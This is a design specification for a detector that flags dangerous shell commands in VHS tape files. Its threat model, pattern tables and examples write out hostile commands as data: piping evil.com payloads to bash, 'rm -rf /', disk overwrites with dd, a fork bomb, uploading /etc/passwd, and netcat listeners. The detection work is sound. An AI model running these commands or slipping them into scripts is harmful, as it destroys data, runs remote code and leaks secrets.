# SPEC_SAFETY.md — Safety Check Engine

**Phase:** 2 — Intelligence & Diagnostics
**Work Stream:** WS-3 (Safety)
**Status:** Stage A (Exploratory Design)
**Owner:** Architect
**Depends On:** phase1/SPEC_PARSER.md (AST — TYPE_COMMAND extraction)
**Last Updated:** 2026-03-19

---

## 1. Purpose

Define the safety check engine that detects potentially dangerous shell
commands inside VHS `Type` directives. VHS `.tape` files execute real
shell commands via `ttyd` — downloaded, shared, or AI-generated tape files
may contain destructive operations. The safety engine provides a proactive
defense layer by scanning `Type` directive content against a pattern
database and emitting diagnostics with risk classifications.

## 2. Cross-Phase Dependencies

| Phase 1 Contract | Usage in This Spec |
| --- | --- |
| SPEC_PARSER.md — PAR-007 (Typed AST accessors) | `TypeCommand::string_args()` extracts string content from TYPE_COMMAND nodes |
| SPEC_PARSER.md — §4 (Node Kind Enumeration) | `TYPE_COMMAND` is the sole AST node kind targeted by safety analysis |
| SPEC_PARSER.md — §5 (Ungrammar) | `TypeCommand = 'Type' Duration? String+` — multiple string arguments are concatenated |
| SPEC_LEXER.md — LEX-007 (String literals) | STRING tokens include delimiters; safety engine strips quotes before analysis |

| Phase 2 Spec | Integration |
| --- | --- |
| SPEC_DIAGNOSTICS.md — DIA-011 (Unified pipeline) | Safety diagnostics are collected by a dedicated function and merged into the unified diagnostic list |
| SPEC_DIAGNOSTICS.md — §8 (Timing) | Safety checks are classified as lightweight (pure string pattern matching on AST) |

## 3. References

| Source | Role |
| --- | --- |
| [VHS README — Type directive](https://github.com/charmbracelet/vhs?tab=readme-ov-file) | `Type` emulates key presses into a live terminal via `ttyd` |
| [ROADMAP.md §2.2.5](../../ROADMAP.md) | "Proactive Safety Checks" as a core technical pillar |
| [8 Deadly Commands — HowToGeek](https://www.howtogeek.com/125157/8-deadly-commands-you-should-never-run-on-linux/) | Reference for destructive command patterns |
| [16 Dangerous Linux Commands — OperaVPS](https://operavps.com/docs/dangerous-linux-commands/) | Extended dangerous command reference |
| Rust Best Practices skill | Pattern matching strategies and data structure design |

## 4. Threat Model

### 4.1 Attack Surface

VHS `Type` directives are the primary attack surface:

```tape
Type "rm -rf /"
Type "curl https://evil.com/payload.sh | bash"
Type "sudo dd if=/dev/zero of=/dev/sda"
```

When VHS runs a `.tape` file, each `Type` directive's text is injected
character-by-character into a live terminal session managed by `ttyd`.
The terminal executes the typed text as real shell commands when followed
by an `Enter` key press.

### 4.2 Threat Scenarios

| Scenario | Risk | Example |
| --- | --- | --- |
| Downloaded tape file | User runs an untrusted `.tape` from the internet | GitHub Gist with hidden `rm -rf ~` |
| AI-generated tape file | LLM hallucinates a destructive command in a demo script | GPT generates `Type "sudo mkfs.ext4 /dev/sda"` |
| Copy-paste from tutorial | User copies a tape snippet without reviewing all lines | Tutorial accidentally includes `sudo chmod 777 /` |
| Supply chain | Malicious `Source` directive includes a remote tape file | `Source "https://evil.com/trojan.tape"` |

### 4.3 Scope Limitations

The safety engine is a **best-effort heuristic** — it is NOT a security
sandbox. Limitations:

- Only scans `Type` directive string content (not `Env` variable values
  or dynamically constructed commands).
- Pattern matching is syntactic, not semantic — obfuscated commands
  (e.g., base64-encoded payloads) are not detected.
- Cannot detect multi-line command construction across multiple `Type` +
  `Enter` sequences.
- Does NOT prevent execution — only warns the user via diagnostics.

## 5. Requirements

### SAF-001 — Type Directive Content Extraction

| Field | Value |
| --- | --- |
| **ID** | SAF-001 |
| **Priority** | P0 (MUST) |
| **Owner** | Architect → Builder |
| **Statement** | The safety engine MUST extract the textual content of all `TYPE_COMMAND` nodes in the AST. For each `TYPE_COMMAND`, the engine MUST: (1) collect all `STRING` child tokens, (2) strip quote delimiters (`"`, `'`, `` ` ``), (3) concatenate multiple string arguments with a single space separator. The resulting string is the "typed command" subject to pattern analysis. |
| **Verification** | `Type "echo" "hello"` → extracted text `echo hello`. `Type 'rm -rf /'` → extracted text `rm -rf /`. |

### SAF-002 — Dangerous Command Pattern Database

| Field | Value |
| --- | --- |
| **ID** | SAF-002 |
| **Priority** | P0 (MUST) |
| **Owner** | Architect → Builder |
| **Statement** | The safety engine MUST maintain a pattern database organized by threat category (§7). Each pattern entry contains: (1) a regex pattern matching the dangerous command, (2) a threat category identifier, (3) a risk severity level, (4) a human-readable description for the diagnostic message. The database MUST be defined as compile-time static data. |
| **Verification** | Pattern database compiles; each entry has all four fields populated. |

### SAF-003 — Risk Severity Levels

| Field | Value |
| --- | --- |
| **ID** | SAF-003 |
| **Priority** | P0 (MUST) |
| **Owner** | Architect → Builder |
| **Statement** | Safety findings MUST be classified into three risk levels that map to LSP `DiagnosticSeverity`: (1) **Critical** → `DiagnosticSeverity::Error` — commands causing irreversible system damage, (2) **Warning** → `DiagnosticSeverity::Warning` — commands that may cause damage or security compromise, (3) **Info** → `DiagnosticSeverity::Information` — suspicious commands with legitimate uses. See §8 for the complete mapping. |
| **Verification** | `rm -rf /` → Critical/Error. `sudo apt update` → Warning. `eval "$var"` → Info. |

### SAF-004 — Detection Algorithm

| Field | Value |
| --- | --- |
| **ID** | SAF-004 |
| **Priority** | P0 (MUST) |
| **Owner** | Architect → Builder |
| **Statement** | The detection algorithm MUST: (1) Walk the AST to find all `TYPE_COMMAND` nodes. (2) Extract typed command text per SAF-001. (3) Normalize the text: collapse multiple spaces, trim leading/trailing whitespace. (4) Split on pipe `\|` to analyze each pipeline stage independently. (5) For each stage, match against all patterns in the database (SAF-002). (6) For matches, emit a `Diagnostic` with the matched pattern's severity, category, and description. The diagnostic range MUST span the `STRING` token(s) of the `TYPE_COMMAND` that contain the matched text. |
| **Verification** | `Type "echo hello \| sudo rm -rf /"` → detects `rm -rf /` (Critical) in the second pipeline stage. |

### SAF-005 — Inline Suppression Mechanism

| Field | Value |
| --- | --- |
| **ID** | SAF-005 |
| **Priority** | P1 (SHOULD) |
| **Owner** | Architect → Builder |
| **Statement** | Users SHOULD be able to suppress safety diagnostics for specific `Type` commands using an inline comment on the immediately preceding line: `# vhs-analyzer-ignore: safety`. When this comment is present, the safety engine SHOULD skip the following `Type` command entirely. The comment MUST be an exact match (case-insensitive for the directive part). Partial suppression (per-rule) MAY be supported: `# vhs-analyzer-ignore: safety/destructive-fs`. |
| **Verification** | A `Type "rm -rf /"` preceded by `# vhs-analyzer-ignore: safety` produces no safety diagnostic. Without the comment, it produces a Critical diagnostic. |

### SAF-006 — Integration with Diagnostic Pipeline

| Field | Value |
| --- | --- |
| **ID** | SAF-006 |
| **Priority** | P0 (MUST) |
| **Owner** | Architect → Builder |
| **Statement** | Safety findings MUST be published as standard LSP `Diagnostic` entries with: (1) `source: "vhs-analyzer"`, (2) `code` set to `"safety/{category}"` (e.g., `"safety/destructive-fs"`, `"safety/privilege-escalation"`), (3) severity per SAF-003 mapping, (4) `message` including the category name and a brief explanation of the risk. Safety diagnostics are merged into the unified pipeline per SPEC_DIAGNOSTICS.md DIA-011. |
| **Verification** | Safety diagnostics appear alongside parse and semantic diagnostics with correct source, code, and severity. |

### SAF-007 — No False Positives on Benign Commands

| Field | Value |
| --- | --- |
| **ID** | SAF-007 |
| **Priority** | P0 (MUST) |
| **Owner** | Architect → Builder |
| **Statement** | The pattern database MUST NOT flag benign common commands. Specifically: (1) `rm file.txt` (no `-rf` flags targeting `/` or `~`) MUST NOT be flagged. (2) `sudo apt update` MUST be flagged as Warning (privilege escalation) but NOT as Critical. (3) `chmod 644 file.txt` MUST NOT be flagged. (4) `curl https://example.com` (no pipe to shell) MUST NOT be flagged. Patterns MUST be sufficiently specific to avoid false positives on normal development commands. |
| **Verification** | Test each benign command listed above; verify no false positives at Critical level. |

## 6. Design Options Analysis

### 6.1 Pattern Matching Strategy

| Option | Description | Pros | Cons |
| --- | --- | --- | --- |
| **A: Compiled regex set** | Use `regex::RegexSet` for parallel matching of all patterns against each pipeline stage | O(n) matching across all patterns simultaneously; well-tested regex engine; `RegexSet` optimized for multi-pattern | Regex crate dependency (already likely in the project); regex compilation cost at startup |
| **B: Manual string matching** | Hand-written `contains()` / `starts_with()` checks per pattern | Zero dependencies; simple for basic patterns | Cannot express complex patterns (e.g., `rm` with specific flags); fragile; hard to maintain |
| **C: Tree-sitter for shell parsing** | Parse the typed text as shell syntax using `tree-sitter-bash` | Semantic understanding of command structure; precise argument analysis | Heavy dependency; overkill for pattern detection; VHS Type content is not always valid shell |

**Recommended: Option A (Compiled regex set).** The `regex` crate is the
standard Rust regex engine (29M+ downloads) and provides `RegexSet` for
efficient parallel matching. VHS safety patterns require regex features
(e.g., `\brm\b.*-[a-z]*r[a-z]*f`, optional flags, pipe detection) that
cannot be cleanly expressed with simple string operations. The `RegexSet`
compiles once at startup and amortizes the cost across all subsequent
checks. Per Rust Best Practices: "prefer well-tested community crates."

### 6.2 Pattern Database Storage

| Option | Description | Pros | Cons |
| --- | --- | --- | --- |
| **A: Static arrays** | Patterns defined as `const` arrays of structs in Rust source | Compile-time validated; zero runtime I/O; matches the Phase 1 hover approach | Regex patterns compiled at runtime (first access) via `OnceLock`/`LazyLock` |
| **B: External config file** | TOML/JSON file loaded at startup | User-extensible; no rebuild needed for pattern updates | Runtime parsing; file discovery complexity; may not exist |
| **C: Hybrid** | Built-in static patterns + optional user config overlay | Best of both; extensible | Two sources of truth; merge logic |

**Recommended: Option A (Static arrays) for Phase 2.** The pattern database
is a security feature — shipping a fixed, audited set of patterns as
compile-time data is safer and more predictable than loading external
files. User-extensible patterns (Option C) are a Phase 3+ feature. Use
`LazyLock<RegexSet>` for one-time compilation of the regex patterns.

### 6.3 Suppression Mechanism Design

| Option | Description | Pros | Cons |
| --- | --- | --- | --- |
| **A: Preceding comment** | `# vhs-analyzer-ignore: safety` on the line before `Type` | Familiar pattern (eslint-disable-next-line); visible in source; preserved by formatter | Must scan comments adjacent to each Type command |
| **B: Inline trailing comment** | `Type "rm -rf /" # vhs-analyzer-ignore: safety` | Comment on the same line as the command | VHS comments must start a line (`#` at position 0 per SPEC_LEXER.md LEX-004); trailing comments are NOT valid VHS syntax |
| **C: Workspace config** | Settings file to disable safety checks globally or per-pattern | Global control; no source modification needed | No per-instance control; users must manage a separate file |

**Recommended: Option A (Preceding comment).** VHS uses `#`-prefixed
line comments. A suppression comment on the line immediately before a
`Type` command is natural and visible. Option B is invalid because VHS
does not support trailing comments (LEX-004 specifies comments start from
`#` at line beginning). Option C may be added in Phase 3 as a complement.

## 7. Dangerous Command Pattern Database

### 7.1 Category: Destructive Filesystem (`destructive-fs`)

| Pattern (Regex) | Risk | Example Match | Description |
| --- | --- | --- | --- |
| `\brm\b\s+.*-[a-z]*r[a-z]*f` | Critical | `rm -rf /`, `rm -fr ~/*` | Recursive force deletion |
| `\brm\b\s+.*-[a-z]*r[a-z]*f\s+[/~]` | Critical | `rm -rf /`, `rm -rf ~/` | Recursive force deletion targeting root or home |
| `\bmkfs\b` | Critical | `mkfs.ext4 /dev/sda` | Format filesystem |
| `\bdd\b\s+.*\bof=/dev/` | Critical | `dd if=/dev/zero of=/dev/sda` | Overwrite disk device |
| `\bshred\b` | Critical | `shred /dev/sda` | Secure file destruction |
| `\bwipefs\b` | Critical | `wipefs -a /dev/sda` | Wipe filesystem signatures |
| `>\s*/dev/sd[a-z]` | Critical | `echo x > /dev/sda` | Redirect output to raw disk |
| `:\(\)\s*\{\s*:\|:\s*&\s*\}\s*;\s*:` | Critical | `:(){ :\|: & };:` | Fork bomb |

### 7.2 Category: Privilege Escalation (`privilege-escalation`)

| Pattern (Regex) | Risk | Example Match | Description |
| --- | --- | --- | --- |
| `\bsudo\b` | Warning | `sudo rm -rf /`, `sudo apt update` | Runs command as superuser |
| `\bsu\b\s+(-\|root)` | Warning | `su -`, `su root` | Switch to root user |
| `\bdoas\b` | Warning | `doas reboot` | OpenBSD privilege escalation |
| `\bpkexec\b` | Warning | `pkexec visudo` | PolicyKit execution |

### 7.3 Category: Remote Code Execution (`remote-exec`)

| Pattern (Regex) | Risk | Example Match | Description |
| --- | --- | --- | --- |
| `\bcurl\b.*\|\s*(ba)?sh` | Critical | `curl https://x.com/s \| sh` | Pipe remote content to shell |
| `\bwget\b.*\|\s*(ba)?sh` | Critical | `wget -O- url \| bash` | Pipe remote download to shell |
| `\bcurl\b.*\|\s*sudo\s+(ba)?sh` | Critical | `curl url \| sudo bash` | Pipe remote content to root shell |
| `\beval\b` | Info | `eval "$cmd"` | Evaluate string as command |
| `\bexec\b\s` | Info | `exec /bin/sh` | Replace current process |

### 7.4 Category: Permission Modification (`permission-mod`)

| Pattern (Regex) | Risk | Example Match | Description |
| --- | --- | --- | --- |
| `\bchmod\b\s+777` | Warning | `chmod 777 /var/www` | World-writable permissions |
| `\bchmod\b\s+.*-R\s+777\s+/` | Critical | `chmod -R 777 /` | Recursive world-writable on root |
| `\bchown\b\s+.*-R\s+.*\s+/` | Warning | `chown -R user:user /` | Recursive ownership change on root |

### 7.5 Category: Data Exfiltration (`data-exfil`)

| Pattern (Regex) | Risk | Example Match | Description |
| --- | --- | --- | --- |
| `\bcurl\b.*-[a-z]*d\s*@/etc/` | Warning | `curl -d @/etc/passwd url` | Upload system file |
| `\bnc\b\s+-[a-z]*l` | Info | `nc -l 4444` | Netcat listener (reverse shell) |
| `\bncat\b\s+-[a-z]*l` | Info | `ncat -l 4444` | Ncat listener |

## 8. Risk Severity ↔ LSP Severity Mapping

| Risk Level | LSP DiagnosticSeverity | Diagnostic Prefix | Use Case |
| --- | --- | --- | --- |
| Critical | Error (1) | `⚠ CRITICAL SAFETY:` | Irreversible system damage; user MUST review |
| Warning | Warning (2) | `⚠ Safety:` | Potential damage or security risk; user SHOULD review |
| Info | Information (3) | `ℹ Safety:` | Suspicious but may have legitimate uses |

## 9. Detection Algorithm Pseudocode

```text
fn collect_safety_diagnostics(root: &SyntaxNode) -> Vec<Diagnostic>:
    diagnostics = []
    patterns = get_compiled_patterns()  // LazyLock<Vec<SafetyPattern>>

    for node in root.descendants():
        if node.kind() != TYPE_COMMAND:
            continue

        // Check for suppression comment on preceding line
        if has_suppression_comment(node, "safety"):
            continue

        // Extract typed text from STRING children
        typed_text = extract_typed_text(node)  // per SAF-001
        if typed_text.is_empty():
            continue

        // Normalize: collapse whitespace, trim
        normalized = normalize(typed_text)

        // Split on pipes and analyze each stage
        for stage in normalized.split('|'):
            stage = stage.trim()
            for pattern in patterns:
                if pattern.regex.is_match(stage):
                    diag = Diagnostic {
                        range: string_tokens_range(node),
                        severity: pattern.severity.to_lsp(),
                        code: format!("safety/{}", pattern.category),
                        source: "vhs-analyzer",
                        message: format!(
                            "{} {} — {}",
                            pattern.severity.prefix(),
                            pattern.category_display,
                            pattern.description
                        ),
                    }
                    diagnostics.push(diag)
                    break  // one match per stage per command

    return diagnostics

fn has_suppression_comment(type_node: &SyntaxNode, scope: &str) -> bool:
    // Walk backward through preceding siblings to find a COMMENT token
    // on the immediately preceding line
    prev = type_node.prev_sibling_or_token()
    // Skip whitespace/newlines to find the previous non-trivia element
    while prev is WHITESPACE or NEWLINE:
        prev = prev.prev_sibling_or_token()
    if prev is COMMENT:
        text = prev.text().trim()
        return text contains "vhs-analyzer-ignore:" and
               (text contains scope or text contains "safety")
    return false
```

## 10. SafetyPattern Data Structure

```rust
struct SafetyPattern {
    regex: &'static str,       // compiled into RegexSet at runtime
    category: &'static str,    // e.g., "destructive-fs"
    severity: RiskLevel,       // Critical | Warning | Info
    description: &'static str, // human-readable risk description
}

enum RiskLevel {
    Critical,
    Warning,
    Info,
}

impl RiskLevel {
    fn to_lsp(&self) -> DiagnosticSeverity { ... }
    fn prefix(&self) -> &'static str { ... }
}
```

The pattern database is a `static` array of `SafetyPattern` entries.
At first access, the regex strings are compiled into a `RegexSet` via
`LazyLock`. Individual `Regex` objects are also compiled for extracting
match positions within the pipeline stage.

## 11. Example Diagnostic Output

For a file containing:

```tape
Type "curl https://evil.com/payload.sh | sudo bash"
```

The safety engine produces:

```json
{
  "range": { "start": { "line": 0, "character": 5 },
             "end": { "line": 0, "character": 50 } },
  "severity": 1,
  "code": "safety/remote-exec",
  "source": "vhs-analyzer",
  "message": "⚠ CRITICAL SAFETY: Remote Code Execution — Piping remote content to shell can execute arbitrary code"
}
```

For a suppressed command:

```tape
# vhs-analyzer-ignore: safety
Type "sudo apt update"
```

No diagnostic is emitted.

## 12. Freeze Candidates

### FC-SAF-01 — Multi-Type Command Sequence Detection

**Status:** Open

**Question:** Should the safety engine detect dangerous commands
constructed across multiple `Type` + `Enter` sequences? For example:

```tape
Type "rm -rf"
Enter
Type " /"
Enter
```

This constructs `rm -rf /` across two Type commands but each individual
Type line may not match any pattern.

**Current recommendation:** Do NOT attempt cross-Type detection in Phase 2.
The complexity of tracking command state across multiple AST nodes is
significant, and the false-positive rate would be high. Document this as
a known limitation in §4.3.

**Resolution criteria:** Assess user feedback and real-world attack
patterns. If demand exists, design a stateful analyzer in Phase 3.

### FC-SAF-02 — Regex Crate Selection

**Status:** Open

**Question:** Should the safety engine use the `regex` crate (standard,
Unicode-aware, larger binary) or `regex-lite` (smaller, ASCII-only)?
Safety patterns only match ASCII shell commands.

**Current recommendation:** Use `regex` (standard). The crate is likely
already in the dependency tree via `tower-lsp-server` or `lsp-types`.
If binary size is a concern, evaluate `regex-lite` during Builder
implementation.

**Resolution criteria:** Check dependency tree during implementation.
If `regex` is already present, use it. If not, evaluate binary size
impact of both options.

### FC-SAF-03 — Workspace-Level Safety Configuration

**Status:** Open

**Question:** Should Phase 2 include a workspace-level configuration
file (e.g., `.vhs-analyzer.toml`) to: (A) disable safety checks globally,
(B) adjust severity levels, (C) add custom patterns?

**Current recommendation:** Do NOT add workspace configuration in Phase 2.
Inline suppression (SAF-005) is sufficient for per-instance control. A
configuration system is a Phase 3 feature that should be co-designed with
the VSCode extension settings.

**Resolution criteria:** Defer to Phase 3 design.

### FC-SAF-04 — Env Directive Safety Scanning

**Status:** Open

**Question:** Should the safety engine also scan `Env` directive values
for dangerous patterns? For example:
`Env PROMPT_COMMAND "curl evil.com | bash"` sets a shell variable that
executes on every prompt.

**Current recommendation:** Do NOT scan `Env` values in Phase 2. The
`PROMPT_COMMAND` scenario is real but niche. Expanding the scan surface
increases false positive risk. Revisit if user feedback indicates demand.

**Resolution criteria:** Assess user feedback post-launch.
